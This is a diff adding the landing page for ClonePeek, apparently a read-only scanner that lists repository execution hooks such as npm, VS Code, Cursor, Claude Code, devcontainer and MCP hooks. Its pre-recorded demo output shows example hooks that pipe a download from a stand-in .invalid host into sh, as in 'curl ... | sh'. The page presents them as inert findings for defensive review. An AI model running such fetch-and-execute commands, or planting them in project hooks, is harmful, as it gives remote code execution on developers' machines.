@@ -1,0 +1,255 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#0c101b">
+  <meta name="description" content="ClonePeek is an offline, read-only CLI and GitHub Action that inventories repo execution hooks before you open, install, or trust unfamiliar source code.">
+  <meta name="robots" content="index,follow">
+  <link rel="canonical" href="https://harshitethic.github.io/clonepeek/">
+  <link rel="icon" type="image/svg+xml" href="./icon.svg">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="ClonePeek — Know what runs before you trust a repo">
+  <meta property="og:description" content="The read-only repo execution audit. Inspect npm, VS Code, devcontainer, Cursor, Claude Code and MCP hooks—without executing project scripts.">
+  <meta property="og:url" content="https://harshitethic.github.io/clonepeek/">
+  <meta property="og:image" content="https://harshitethic.github.io/clonepeek/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="ClonePeek — Know what runs">
+  <meta name="twitter:description" content="A passive CLI and GitHub Action to review repository execution surfaces.">
+  <meta name="twitter:image" content="https://harshitethic.github.io/clonepeek/og.png">
+  <title>ClonePeek — Know what runs before you trust a repository</title>
+  <style>
+    :root{color-scheme:dark;--bg:#0c101b;--ink:#eff1fb;--muted:#a1a9bf;--line:#2d354b;--accent:#b8a2ff;--a2:#80eadc;--alert:#ffc5a0;--shadow:0 25px 100px #01030965}
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth;scroll-padding-top:96px}
+    body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.62 system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;overflow-x:hidden}
+    body:before{content:"";position:absolute;inset:0 0 auto;height:900px;background:radial-gradient(ellipse 46% 36% at 21% 14%,#8e65ed1b,transparent 100%),radial-gradient(ellipse 38% 48% at 88% 20%,#29c9cb12,transparent 100%);pointer-events:none}
+    a{color:inherit;text-decoration:none}
+    button{font:inherit;cursor:pointer}
+    .wrap{width:min(1130px,calc(100% - 46px));margin:auto;position:relative}
+    .skip{position:absolute;top:-100px;left:16px;background:white;color:black;padding:10px;z-index:100}
+    .skip:focus{top:12px}
+    .top{position:sticky;top:0;z-index:20;border-bottom:1px solid #ffffff13;background:#0c101be6;backdrop-filter:blur(17px)}
+    .nav{min-height:75px;display:flex;align-items:center;justify-content:space-between;gap:20px}
+    .brand{display:inline-flex;align-items:center;gap:12px;font-weight:760;letter-spacing:-.055em;font-size:24px}
+    .mark{width:35px;height:35px;border:1px solid #d3c2ff55;border-radius:12px;background:linear-gradient(150deg,#a37efb3d,#69f2e82a);display:grid;place-items:center;box-shadow:inset 0 0 21px #d4cbff14}
+    .mark svg{width:24px;height:24px}
+    .links{display:flex;align-items:center;gap:29px;color:var(--muted);font-size:14px}
+    .links a:hover,.subtle-link:hover{color:var(--ink)}
+    .nav-cta{font-size:14px;border:1px solid #a89cf37e;color:#ede8ff;padding:9px 15px;border-radius:10px;background:#8b70e72b}
+    .nav-cta:hover,.secondary:hover{background:#9580f044}
+    .hero{padding:98px 0 65px}
+    .eyebrow{display:inline-flex;align-items:center;gap:9px;padding:6px 13px;border-radius:100px;color:#d8cffb;background:#9380d819;border:1px solid #ac9bdf40;font-size:12px;font-weight:700;letter-spacing:.065em;text-transform:uppercase}
+    .dot{width:7px;height:7px;display:inline-block;background:var(--a2);border-radius:50%;box-shadow:0 0 0 5px #80eadc19}
+    h1,h2,h3,p{margin-top:0}
+    h1{margin:23px 0 21px;font-size:clamp(48px,6.6vw,83px);line-height:1.05;letter-spacing:-.073em;max-width:880px;font-weight:800}
+    h1 em{font-style:normal;color:var(--accent)}
+    .lead{font-size:clamp(17px,2.1vw,20px);line-height:1.66;color:#b0bbce;max-width:725px}
+    .actions{display:flex;flex-wrap:wrap;gap:12px;margin:30px 0 33px;align-items:center}
+    .primary,.secondary{border-radius:12px;display:inline-flex;align-items:center;justify-content:center;gap:10px;font-size:14px;font-weight:730;padding:13px 19px;min-height:47px}
+    .primary{background:#c1abff;color:#151025;border:1px solid #dbcdff}
+    .primary:hover{background:#d3c3ff;transform:translateY(-1px)}
+    .secondary{background:#ffffff0a;color:#e7e7f4;border:1px solid #ffffff25}
+    .cred{display:flex;align-items:center;flex-wrap:wrap;gap:10px 21px;color:#8894ad;font-size:13px}
+    .cred span{display:inline-flex;align-items:center;gap:7px}
+    .cred svg{width:14px;height:14px;color:var(--a2)}
+    section{padding:52px 0}
+    .section-head{display:flex;justify-content:space-between;align-items:end;gap:24px;margin-bottom:25px}
+    .overline{color:var(--a2);font-size:12px;letter-spacing:.13em;text-transform:uppercase;font-weight:750;margin-bottom:12px}
+    h2{font-size:clamp(31px,4vw,46px);line-height:1.13;letter-spacing:-.051em;margin-bottom:10px}
+    .section-head p{color:var(--muted);max-width:520px;margin-bottom:0}
+    .terminal{background:#0c111b;border:1px solid #414664;border-radius:18px;overflow:hidden;box-shadow:var(--shadow)}
+    .terminal-head{display:flex;align-items:center;justify-content:space-between;gap:15px;padding:15px 20px;background:#1d2232;border-bottom:1px solid #ffffff19}
+    .window{display:flex;align-items:center;gap:7px}
+    .window i{display:block;width:9px;height:9px;border-radius:50%;background:#f6a8a0;opacity:.85}
+    .window i:nth-child(2){background:#f1c583}
+    .window i:nth-child(3){background:#91d7b5}
+    .window span{margin-left:10px;color:#a6b2ca;font:12px ui-monospace,SFMono-Regular,Consolas,monospace}
+    .tabs{display:flex;gap:6px}
+    .tabs button{border:1px solid transparent;background:transparent;color:#b1bbd0;border-radius:8px;padding:6px 10px;font-size:12px}
+    .tabs button[aria-selected=true]{border-color:#9f91dc6b;color:#f7f4ff;background:#9b82fb22}
+    .output{margin:0;max-height:370px;min-height:290px;overflow:auto;padding:27px 24px;font:13px/1.74 ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace;white-space:pre-wrap;overflow-wrap:anywhere;color:#cdd5e8}
+    .terminal-note{border-top:1px solid #ffffff16;padding:13px 22px;font-size:12px;color:#8f9caf;background:#111726}
+    .terminal-note strong{color:var(--a2);font-weight:650}
+    .grid3{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:15px}
+    .tile{background:linear-gradient(150deg,#1b2030d9,#121725);border:1px solid #343a51;border-radius:17px;padding:25px;min-height:225px}
+    .tile-number{color:#bca8ff;font:700 13px/1.5 ui-monospace,monospace}
+    .tile h3{font-size:19px;letter-spacing:-.025em;margin:16px 0 8px}
+    .tile p{font-size:14px;color:#aab4cb;line-height:1.7}
+    .steps{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+    .step{border:1px solid #343a51;border-radius:16px;background:#151b2b;padding:25px}
+    .step h3{font-size:20px;letter-spacing:-.032em;margin:12px 0 7px}
+    .step p{color:var(--muted);font-size:14px}
+    .command{display:flex;align-items:start;gap:11px;padding:16px;background:#080c15;border:1px solid #353e59;border-radius:11px;margin-top:19px}
+    .command code{color:#c1e9dd;flex:1;min-width:0;overflow-wrap:anywhere;font:12px/1.7 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+    .copy{background:#242c43;color:#e4e7f6;border:1px solid #536082;border-radius:8px;padding:6px 10px;font-size:12px;white-space:nowrap}
+    .copy:hover{border-color:#bfadff}
+    .proof{display:grid;grid-template-columns:1.15fr 1fr;gap:22px;align-items:stretch}
+    .proof-card{padding:30px;border:1px solid #383f58;border-radius:16px;background:linear-gradient(140deg,#24223c,#151a28)}
+    .proof-card p{color:#b4bfd0;font-size:14px}
+    .proof-card strong{color:#ece5ff}
+    .proof-list{display:grid;gap:12px}
+    .proof-list a{background:#171d2c;border:1px solid #343b51;border-radius:13px;padding:17px;display:flex;justify-content:space-between;gap:15px;align-items:center;font-size:14px;color:#d4dcf1}
+    .proof-list a:hover{border-color:#9d8bda}
+    .faq{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+    .faq article{padding:21px;border:1px solid #30374e;border-radius:13px}
+    .faq h3{font-size:16px;margin-bottom:7px}
+    .faq p{font-size:13px;color:var(--muted);margin:0}
+    .final{border:1px solid #53466d;border-radius:22px;padding:43px;background:radial-gradient(ellipse 70% 110% at 0% 0%,#9d81f42c,transparent),linear-gradient(130deg,#22223e,#151b29);text-align:center;margin:50px 0 75px}
+    .final h2{max-width:700px;margin:auto auto 14px}
+    .final p{color:#c0bdd5;max-width:630px;margin:auto auto 24px}
+    footer{border-top:1px solid #ffffff19;color:#8290a9;padding:25px 0 40px;font-size:13px}
+    .foot-row{display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap}
+    .foot-links{display:flex;gap:20px;flex-wrap:wrap}
+    :focus-visible{outline:2px solid #b9a9ff;outline-offset:3px}
+    @media(max-width:750px){
+      .wrap{width:min(100% - 32px,1130px)}
+      .links{gap:14px}
+      .links>a:nth-child(1),.links>a:nth-child(2){display:none}
+      .hero{padding:75px 0 42px}
+      .grid3,.steps,.proof,.faq{grid-template-columns:1fr}
+      .tile{min-height:0}
+      .section-head{align-items:start;flex-direction:column}
+      .terminal-head{flex-wrap:wrap}
+      .tabs{width:100%;overflow-x:auto}
+      .output{padding:18px 15px;font-size:12px}
+      .final{padding:29px 20px}
+    }
+    @media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}*{transition:none!important}}
+  </style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<header class="top"><div class="wrap nav">
+  <a class="brand" href="./" aria-label="ClonePeek home">
+    <span class="mark"><svg viewBox="0 0 32 32" fill="none" aria-hidden="true"><path d="M12 9l-7 7 7 7M20 9l7 7-7 7" stroke="#D7C9FF" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><path d="m18 6-4 20" stroke="#82F0DC" stroke-width="2.3" stroke-linecap="round"/></svg></span>
+    clonepeek<span style="color:var(--a2)">.</span>
+  </a>
+  <nav class="links" aria-label="Main navigation">
+    <a href="#how">How it works</a>
+    <a href="#evidence">Evidence</a>
+    <a href="#install">Install</a>
+    <a class="nav-cta" href="https://github.com/harshitethic/clonepeek">GitHub ↗</a>
+  </nav>
+</div></header>
+<main id="main">
+<div class="wrap hero">
+  <span class="eyebrow"><span class="dot"></span> Open source · CLI + GitHub Action · MIT</span>
+  <h1>Know what runs.<br><em>Before you trust a repo.</em></h1>
+  <p class="lead">Your editor, package manager and coding agents can launch commands described inside a repository. ClonePeek inventories <strong>known execution hooks</strong> before you choose to open, install or trust it. No project code executed.</p>
+  <div class="actions">
+    <a class="primary" href="#install">Run a passive audit <span aria-hidden="true">↗</span></a>
+    <a class="secondary" href="#demo">See the real demo <span aria-hidden="true">↓</span></a>
+  </div>
+  <div class="cred"><span>◈ <strong>64 automated tests</strong></span><span>◈ <strong>Windows · Linux · macOS CI</strong></span><span>◈ <strong>Python 3.10+</strong></span><span>◈ <strong>Zero runtime dependencies</strong></span></div>
+</div>
+<section id="demo" class="wrap" aria-labelledby="demo-title">
+  <div class="section-head"><div><div class="overline">01 / Real scanner output</div><h2 id="demo-title">See the hooks. Not just the files.</h2></div><p>These are pre-recorded outputs from versioned, synthetic examples in the repository. Switching tabs does not scan or execute anything.</p></div>
+  <div class="terminal">
+    <div class="terminal-head">
+      <div class="window" aria-hidden="true"><i></i><i></i><i></i><span>clonepeek • passive audit</span></div>
+      <div class="tabs" role="tablist" aria-label="Demo fixture">
+        <button type="button" role="tab" aria-selected="true" id="agent-tab" data-example="agent" aria-controls="output">Agent hooks</button>
+        <button type="button" role="tab" aria-selected="false" id="script-tab" data-example="script" aria-controls="output">Indirect script</button>
+      </div>
+    </div>
+    <pre id="output" class="output" role="tabpanel" aria-labelledby="agent-tab">ClonePeek · 2 inspected · 0 skipped · 3 execution surfaces
+1 critical · 1 high · 1 medium · 0 low · 0 info
+
+[CRITICAL] Cursor project hook: workspaceOpen
+  .cursor/hooks.json:5 · Cursor workspaceOpen event
+  curl https://example.invalid/bootstrap.sh | sh
+  Why: A network response appears to be piped directly to a command interpreter.
+
+[HIGH] Claude Code command hook: SessionStart
+  .claude/settings.json:5 · Claude Code SessionStart event (matcher: *)
+  echo session-ready
+
+[MEDIUM] Cursor project hook: afterFileEdit
+  .cursor/hooks.json:8 · Cursor afterFileEdit event
+  echo formatting-completed</pre>
+    <div class="terminal-note"><strong>Demo only.</strong> Reserved <code>.invalid</code> addresses; commands never executed. Severity describes heuristic review priority, not confirmed malicious behavior. <a class="subtle-link" href="https://github.com/harshitethic/clonepeek/blob/main/assets/demo-output.txt">See full original output ↗</a></div>
+  </div>
+</section>
+<section class="wrap" id="how">
+  <div class="section-head"><div><div class="overline">02 / What it checks</div><h2>Potential execution, mapped.</h2></div><p>Each finding links a command or executable to a trigger, source file, line number and review step.</p></div>
+  <div class="grid3">
+    <div class="tile"><span class="tile-number">01 / EDITOR</span><h3>VS Code tasks</h3><p>Discover <code>folderOpen</code> tasks that may run when workspace trust and automatic-task controls permit.</p></div>
+    <div class="tile"><span class="tile-number">02 / PACKAGE</span><h3>npm lifecycle</h3><p>Inventory hooks such as <code>postinstall</code>, <code>prepare</code> and explicit first-hop local shell references.</p></div>
+    <div class="tile"><span class="tile-number">03 / AGENT</span><h3>Cursor + Claude Code</h3><p>Review project command hooks attached to editor and coding-agent lifecycle events.</p></div>
+    <div class="tile"><span class="tile-number">04 / CONTAINER</span><h3>Devcontainers</h3><p>Flag startup, setup and lifecycle commands declared in development-container configs.</p></div>
+    <div class="tile"><span class="tile-number">05 / MCP</span><h3>Process launch configs</h3><p>Understand commands used to start locally configured Model Context Protocol servers.</p></div>
+    <div class="tile"><span class="tile-number">06 / CI</span><h3>SARIF + diff reports</h3><p>Produce machine-readable reports and optionally flag new findings against a reviewed baseline.</p></div>
+  </div>
+</section>
+<section class="wrap" id="install">
+  <div class="section-head"><div><div class="overline">03 / Start safely</div><h2>One command. No repo scripts.</h2></div><p>Install the trusted scanner first. Review the unfamiliar repository from a separate terminal before running its tools.</p></div>
+  <div class="steps">
+    <div class="step"><span class="tile-number">LOCAL CLI</span><h3>Inspect a directory</h3><p>Needs Python 3.10+ and <code>uv</code>. The initial package download uses the network; scans do not.</p>
+      <div class="command"><code id="cli-command">uvx --from git+https://github.com/harshitethic/clonepeek@v0.5.0 clonepeek /path/to/repo</code><button class="copy" data-copy="cli-command" type="button" aria-label="Copy CLI command">Copy</button></div>
+      <p style="margin:15px 0 0"><a class="subtle-link" href="https://github.com/harshitethic/clonepeek/blob/main/docs/BEFORE-YOU-TRUST-A-REPO.md">Read the five-minute audit guide ↗</a></p>
+    </div>
+    <div class="step"><span class="tile-number">GITHUB ACTIONS</span><h3>Review new PR changes</h3><p>Use ClonePeek as a composite action; report-only is the default. Enable severity gates only after reviewing your baseline.</p>
+      <div class="command"><code id="action-command">- uses: harshitethic/clonepeek@v0.5.0
+  with:
+    fail-on: none</code><button class="copy" data-copy="action-command" type="button" aria-label="Copy workflow snippet">Copy</button></div>
+      <p style="margin:15px 0 0"><a class="subtle-link" href="https://github.com/harshitethic/clonepeek/blob/main/docs/GITHUB-ACTION.md">Full workflow with checkout and options ↗</a></p>
+    </div>
+  </div>
+</section>
+<section class="wrap" id="evidence">
+  <div class="section-head"><div><div class="overline">04 / Verified, not inflated</div><h2>Built for skeptical developers.</h2></div><p>Source links and reproducible evidence, with what was—and wasn't—tested.</p></div>
+  <div class="proof">
+    <div class="proof-card"><span class="eyebrow">Evidence, with limits</span><h3 style="font-size:26px;margin:22px 0 12px;letter-spacing:-.04em">64 tests. Three OSes. Two pinned public config snapshots.</h3><p>CI tested the GitHub Action on Windows, Linux and macOS. A maintainer-run <strong>separate-repository</strong> smoke test checked exact Git blobs and found <strong>7 Cursor hook commands</strong> and <strong>2 VS Code folder-open tasks</strong>.</p><p style="margin-bottom:0">These are intentionally selected test cases—not representative accuracy, independent adoption, or a malware verdict.</p></div>
+    <div class="proof-list">
+      <a href="https://github.com/harshitethic/clonepeek/blob/main/docs/CROSS-REPO-SMOKE.md">Cross-repository proof <span aria-hidden="true">↗</span></a>
+      <a href="https://github.com/harshitethic/clonepeek/actions/workflows/composite-action.yml">Real reusable-action CI <span aria-hidden="true">↗</span></a>
+      <a href="https://github.com/harshitethic/clonepeek/blob/main/docs/EVALUATION.md">Synthetic evaluation and error cases <span aria-hidden="true">↗</span></a>
+      <a href="https://github.com/harshitethic/clonepeek/blob/main/docs/THREAT_MODEL.md">Threat model + blind spots <span aria-hidden="true">↗</span></a>
+    </div>
+  </div>
+</section>
+<section class="wrap">
+  <div class="section-head"><div><div class="overline">05 / Scope matters</div><h2>A review aid, not a green light.</h2></div></div>
+  <div class="faq">
+    <article><h3>Does this execute the project?</h3><p>No. The scanner reads supported config files and bounded literal local shell references. It does not run package scripts, code hooks or MCP servers.</p></article>
+    <article><h3>Does zero findings mean safe?</h3><p>No. Dynamic paths, nested scripts, language import/build execution and other surfaces are outside the current scope. A report cannot certify repository safety.</p></article>
+    <article><h3>Is this malware detection?</h3><p>No. Severity is a heuristic review priority. Legitimate automatic tasks can be flagged high; reported findings are not evidence of compromise.</p></article>
+    <article><h3>Can I contribute a missed case?</h3><p>Yes. Inert and redacted minimal examples are welcome. Please don't submit live malicious payloads, credentials or private code.</p></article>
+  </div>
+</section>
+<div class="wrap">
+  <div class="final"><span class="eyebrow">MIT licensed · openly developed</span><h2>Trust your tools. Inspect the hooks.</h2><p>ClonePeek is small, read-only and candid about its limits. Review the source, run the harmless demo, or contribute a missing execution surface.</p><div class="actions" style="justify-content:center;margin-bottom:0"><a class="primary" href="https://github.com/harshitethic/clonepeek">View the source on GitHub ↗</a><a class="secondary" href="https://github.com/harshitethic/clonepeek/issues/14">Contribute a test case ↗</a></div></div>
+</div>
+</main>
+<footer><div class="wrap foot-row"><span>© 2026 ClonePeek contributors · MIT · No tracking or telemetry on this landing page</span><div class="foot-links"><a href="https://github.com/harshitethic/clonepeek">GitHub</a><a href="https://github.com/harshitethic/clonepeek/releases/tag/v0.5.0">Release v0.5.0</a><a href="https://github.com/harshitethic/clonepeek/blob/main/docs/THREAT_MODEL.md">Threat model</a></div></div></footer>
+<script>
+(() => {
+  'use strict';
+  const tabs = Array.from(document.querySelectorAll('[data-example]'));
+  const output = document.getElementById('output');
+  const demos = {
+    agent: output.textContent,
+    script: 'ClonePeek · 1 inspected · 0 skipped · 2 execution surfaces\n1 critical · 0 high · 1 medium · 0 low · 0 info\n\n[CRITICAL] Potentially risky command in referenced local shell script\n  scripts/setup.sh:4 · Referenced by package.json:5 (npm-lifecycle)\n  curl https://example.invalid/illustrative-installer.sh | sh\n  Why: This line is inside an explicitly referenced .sh file.\n       A network response appears to be piped directly to a command interpreter.\n\n[MEDIUM] npm lifecycle script: postinstall\n  package.json:5 · npm install (after install)\n  sh ./scripts/setup.sh'
+  };
+  tabs.forEach(tab => tab.addEventListener('click', () => {
+    tabs.forEach(other => other.setAttribute('aria-selected', String(other === tab)));
+    output.textContent = demos[tab.dataset.example];
+    output.setAttribute('aria-labelledby', tab.id);
+    output.scrollTop = 0;
+  }));
+  document.querySelectorAll('[data-copy]').forEach(button => button.addEventListener('click', async () => {
+    const source = document.getElementById(button.dataset.copy);
+    const label = button.textContent;
+    try {
+      await navigator.clipboard.writeText(source.textContent.trim());
+      button.textContent = 'Copied!';
+    } catch {
+      button.textContent = 'Select text';
+    }
+    window.setTimeout(() => { button.textContent = label; }, 2100);
+  }));
+})();
+</script>
+</body>
+</html>
